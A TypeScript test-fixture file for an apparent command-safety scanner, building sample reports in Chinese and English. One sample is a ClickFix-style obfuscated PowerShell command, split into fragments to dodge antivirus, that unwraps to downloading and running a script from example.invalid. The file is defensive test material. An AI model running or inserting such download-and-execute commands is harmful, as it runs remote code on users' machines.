/**
 * Fixture Reports for demos and tests (shape: docs/plan/phase-2.md §2.2).
 *
 * The command samples are harmless (`calc`, `example.invalid`) and assembled from fragments at
 * runtime so no complete ClickFix string exists in the source (antivirus quarantines those).
 * Secret values are masked placeholders; there is no plaintext anywhere.
 */
import type { Locale, Report } from '../report';

const j = (...parts: string[]) => parts.join('');

const PS = j('power', 'shell');
const IWR = j('i', 'wr');
const IEX = j('i', 'ex');
const HOST = j('example', '.invalid');
const URL_ = j('https://', HOST, '/verify', '.ps1');

const TEXT = {
  'zh-TW': {
    reasonExec: '會下載並執行網路上的程式碼（下載後直接執行）',
    reasonHidden: `用 ${PS} 的隱藏視窗參數執行`,
    reasonObf: '指令經過多層混淆（跳脫字元、Base64、字串拼接）',
    reasonClick: '常見的「假驗證」手法：要你按 Win+R 貼上',
    stepCaret: '移除了 14 個 ^ 跳脫字元',
    stepEnc: '解開 -EncodedCommand（UTF-16LE Base64）',
    stepConcat: '合併了 3 段字串拼接',
    stepUnwrap: '展開被當成指令執行的字串',
    warnReason: '會執行計算機程式（calc），但沒有其他攻擊特徵',
    hiddenReason: '含有 2 個零寬字元',
    labelId: '身分證字號',
    labelCard: '信用卡號',
    labelKey: 'API 金鑰',
  },
  en: {
    reasonExec: 'Downloads code from the internet and runs it immediately',
    reasonHidden: `Runs ${PS} with a hidden window`,
    reasonObf:
      'The command is obfuscated in several layers (escapes, Base64, string concatenation)',
    reasonClick: 'A common fake-verification trick: it asks you to press Win+R and paste',
    stepCaret: 'Removed 14 ^ escapes',
    stepEnc: 'Decoded -EncodedCommand (UTF-16LE Base64)',
    stepConcat: 'Joined 3 concatenated strings',
    stepUnwrap: 'Unwrapped a string that is run as a command',
    warnReason: 'Starts the Calculator (calc) with no other attack signals',
    hiddenReason: 'Contains 2 zero-width characters',
    labelId: 'National ID',
    labelCard: 'Card number',
    labelKey: 'API key',
  },
} satisfies Record<Locale, Record<string, string>>;

export interface FixtureSet {
  /** quarantine: obfuscated download-and-run, 4-layer trace. */
  clickfix: Report;
  /** warn: a plain `calc` launch plus hidden characters. */
  warn: Report;
  /** allow (for commands) with three masked secrets. */
  secrets: Report;
  /** allow: nothing found. */
  clean: Report;
  /** What `mask()` would return for the `secrets` sample. */
  secretsMaskedText: string;
}

export function fixtureReports(locale: Locale = 'zh-TW'): FixtureSet {
  const x = TEXT[locale];
  const clickfix: Report = {
    schema: 1,
    action: 'quarantine',
    truncated: false,
    command: {
      level: 'malicious',
      risk_score: 92,
      reasons: [
        { id: 'cmd-reason-download-exec', text: x.reasonExec },
        { id: 'cmd-reason-hidden-window', text: x.reasonHidden },
        { id: 'cmd-reason-obfuscated', text: x.reasonObf },
        { id: 'cmd-reason-run-dialog', text: x.reasonClick },
      ],
      trace: [
        {
          kind: 'caret',
          text: x.stepCaret,
          preview: j(PS, ' -w hidden -enc aQB', 'leAAgACgAJwBpAHcAJwArACcAcgAgAGUAeABhAG0AcA…'),
        },
        {
          kind: 'encoded_command',
          text: x.stepEnc,
          preview: j(IEX, " ('iw'+'r ", "exam'+'ple.inv'+'alid/verify.ps1')"),
        },
        {
          kind: 'concat',
          text: x.stepConcat,
          preview: j(IEX, " ('", IWR, ' ', URL_, "')"),
        },
        {
          kind: 'unwrap',
          text: x.stepUnwrap,
          preview: j(IWR, ' ', URL_, ' | ', IEX),
        },
      ],
      hosts: [HOST],
    },
    secrets: [],
    hidden: { level: 'none', reasons: [] },
    wallets: [],
  };

  const warn: Report = {
    schema: 1,
    action: 'warn',
    truncated: false,
    command: {
      level: 'suspicious',
      risk_score: 41,
      reasons: [{ id: 'cmd-reason-launch', text: x.warnReason }],
      trace: [{ kind: 'concat', text: x.stepConcat, preview: j('c', 'alc') }],
      hosts: [],
    },
    secrets: [],
    hidden: { level: 'suspicious', reasons: [{ id: 'hidden-zero-width', text: x.hiddenReason }] },
    wallets: [],
  };

  const secrets: Report = {
    schema: 1,
    action: 'warn',
    truncated: false,
    command: { level: 'none', risk_score: 0, reasons: [], trace: [], hosts: [] },
    secrets: [
      {
        kind: 'national_id',
        rule_id: 'tw-national-id',
        label: x.labelId,
        masked: 'A1*******9',
        span_utf16: [6, 10],
      },
      {
        kind: 'credit_card',
        rule_id: 'credit-card',
        label: x.labelCard,
        masked: '4111 **** **** 1111',
        span_utf16: [22, 19],
      },
      {
        kind: 'api_key',
        rule_id: 'openai-key',
        label: x.labelKey,
        masked: 'sk-p…****…Q3x',
        span_utf16: [47, 51],
      },
    ],
    hidden: { level: 'none', reasons: [] },
    wallets: [],
  };

  const clean: Report = {
    schema: 1,
    action: 'allow',
    truncated: false,
    command: { level: 'none', risk_score: 0, reasons: [], trace: [], hosts: [] },
    secrets: [],
    hidden: { level: 'none', reasons: [] },
    wallets: [],
  };

  const secretsMaskedText =
    locale === 'zh-TW'
      ? '身分證：A1*******9\n卡號：4111 **** **** 1111\nkey: sk-p…****…Q3x'
      : 'ID: A1*******9\nCard: 4111 **** **** 1111\nkey: sk-p…****…Q3x';

  return { clickfix, warn, secrets, clean, secretsMaskedText };
}
